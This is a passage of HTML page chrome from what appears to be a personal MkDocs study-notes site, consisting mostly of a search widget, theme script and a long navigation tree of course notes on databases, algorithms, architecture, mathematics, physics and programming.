        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256l137.3-137.4c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="查找">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/kailqq/kailqq.github.io" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
  </div>
  <div class="md-source__repository">
    𝓚𝓪𝓲𝓵𝓺𝓺
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href=".." class="md-tabs__link">
        
  
  
    
  
  首页

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../NOTE/" class="md-tabs__link">
          
  
  
    
  
  📚 学习笔记

        </a>
      </li>
    
  

      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../friends/" class="md-tabs__link">
        
  
  
    
  
  🚀 友情链接

      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="71229号港湾" class="md-nav__button md-logo" aria-label="71229号港湾" data-md-component="logo">
      
  <img src="../static/images/logo.png" alt="logo">

    </a>
    71229号港湾
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/kailqq/kailqq.github.io" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
  </div>
  <div class="md-source__repository">
    𝓚𝓪𝓲𝓵𝓺𝓺
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    首页
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
  
    <a href="../NOTE/" class="md-nav__link">
      
  
  
  <span class="md-ellipsis">
    📚 学习笔记
    
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../friends/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    🚀 友情链接
    
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#index" class="md-nav__link">
    <span class="md-ellipsis">
      1 首页
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#section-2" class="md-nav__link">
    <span class="md-ellipsis">
      2 📚 学习笔记
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2 📚 学习笔记">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note" class="md-nav__link">
    <span class="md-ellipsis">
      2.1 我的笔记
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-2" class="md-nav__link">
    <span class="md-ellipsis">
      2.2 🎓 课程笔记
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.2 🎓 课程笔记">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#section-2-2-1" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1 数据库系统
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.2.1 数据库系统">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-db" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1.1 数据库系统
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-db-lec1" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1.2 介绍
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-db-lec2" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1.3 关系模型
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-db-sql" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1.4 SQL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-db-er" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1.5 ER模型
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-db-lec7" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1.6 关系数据库设计
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-db-lec8" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1.7 内存管理
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-db-indexing" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1.8 索引
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-db-query" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1.9 查询处理
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-db-optimization" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1.10 查询优化
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-db-transaction" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1.11 事务
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-db-concurrency" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1.12 并发控制
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-db-recovery" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.1.13 恢复
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-2-2" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.2 计算机组成与设计
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.2.2 计算机组成与设计">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-co" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.2.1 计算机组成与设计
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-co-wk1" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.2.2 绪论
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-co-wk3" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.2.3 指令集
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-co-wk2" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.2.4 计算机中的算数
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-co-wk4" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.2.5 处理器
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-co-wk5" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.2.6 内存层次
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-co-wk6" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.2.7 存储和IO
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-2-3" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3 高级数据结构与算法分析
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.2.3 高级数据结构与算法分析">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-ads" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.1 高级数据结构与算法分析
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk1" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.2 AVL，Splay树与摊还分析
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk2" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.3 红黑树与B+树
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk3_1" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.4 倒排索引
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk3_2" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.5 左式堆与斜堆
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk4" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.6 二项堆
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk5" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.7 回溯法
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk6" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.8 分治法
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk7" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.9 动态规划
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk8" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.10 贪心法
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk9" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.11 NP分析
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk10" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.12 近似算法
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk11" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.13 局部搜索
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk12" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.14 随机算法
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk13" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.15 并行算法
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ads-wk14" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.3.16 外部排序
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-2-4" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.4 计算机体系结构
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.2.4 计算机体系结构">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-arch" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.4.1 计算机体系结构
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-arch-chap1" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.4.2 Fundamentals
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-arch-chap4" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.4.3 指令级并行
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-2-5" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.5 数据要素市场
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.2.5 数据要素市场">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-datamarket" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.5.1 数据要素市场
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-datamarket-gametheory" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.5.2 博弈论基础
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-datamarket-mab" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.5.3 多臂老虎机算法
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-datamarket-shapley" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.5.4 Shapley值
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-datamarket-auction" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.5.5 拍卖与机制设计基础
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-datamarket-optauction" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.5.6 最优机制
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-datamarket-beyesian" class="md-nav__link">
    <span class="md-ellipsis">
      2.2.5.7 贝叶斯劝说
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-3" class="md-nav__link">
    <span class="md-ellipsis">
      2.3 🔬 数学与物理
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.3 🔬 数学与物理">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#section-2-3-1" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.1 线性代数 (LINEAR-ALGEBRA)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.3.1 线性代数 (LINEAR-ALGEBRA)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-la-linear-algebra" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.1.1 线性代数个人笔记
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-la-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.1.2 基础
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-la-note" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.1.3 停更
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-la-eigenvalue" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.1.4 讲义
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-3-2" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.2 概率论
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.3.2 概率论">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-probability" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.2.1 概率论(H)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-probability-first" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.2.2 第一章
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-probability-second" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.2.3 第二章
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-probability-third" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.2.4 第三章
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-probability-fourth" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.2.5 第四章
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-probability-others" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.2.6 其它
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-3-3" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.3 数学分析
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.3.3 数学分析">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-ma" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.3.1 数学分析一，二的个人手写笔记
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-3-4" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.4 普通物理学二
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.3.4 普通物理学二">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-physics" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.4.1 普通物理学二(H)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-physics-eletronic" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.4.2 电学
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-physics-magnetism" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.4.3 磁学
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-physics-electrodynamincs" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.4.4 电动力学
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-physics-maxwell" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.4.5 Maxwell方程
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-physics-light" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.4.6 光学
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-physics-quantum" class="md-nav__link">
    <span class="md-ellipsis">
      2.3.4.7 量子力学
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-4" class="md-nav__link">
    <span class="md-ellipsis">
      2.4 💻 自学笔记
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.4 💻 自学笔记">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-cs" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.1 一些自学
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-4-2" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.2 Missing Semester (TMS)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.4.2 Missing Semester (TMS)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-cs-tms" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.2.1 The Missing Semester
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-tms-overview-and-shell" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.2.2 概览与shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-tms-shell-tools-and-scripts" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.2.3 shell工具与脚本
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-tms-data-wrangling" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.2.4 数据整理
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-tms-command-line-environment" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.2.5 命令行环境
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-tms-debugging-and-profiling" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.2.6 调试与性能分析
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-tms-metaprogramming" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.2.7 元编程
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-tms-security-and-cryptography" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.2.8 安全和密码学
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-tms-miscellaneous" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.2.9 大杂烩
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-4-3" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.3 Git 版本控制
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.4.3 Git 版本控制">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-cs-git" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.3.1 Git 笔记
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-4-4" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.4 编程语言
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.4.4 编程语言">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-cs-verilog-verilog" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.4.1 Verilog学习笔记
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-rust-rust" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.4.2 RUST学习笔记
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-4-4-3" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.4.3 汇编学习笔记
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.4.4.3 汇编学习笔记">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-cs-asm-wk1" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.4.3.1 硬件组成
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-asm-wk1_2" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.4.3.2 程序格式
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-asm-wk2" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.4.3.3 数据表示
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-asm-wk3" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.4.3.4 寻址方式
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-4-5" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5 计算机视觉 (Computer Vision)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.4.5 计算机视觉 (Computer Vision)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-cs-cv" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.1 Computer Vision
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-cv-lec1" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.2 Image Classification
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
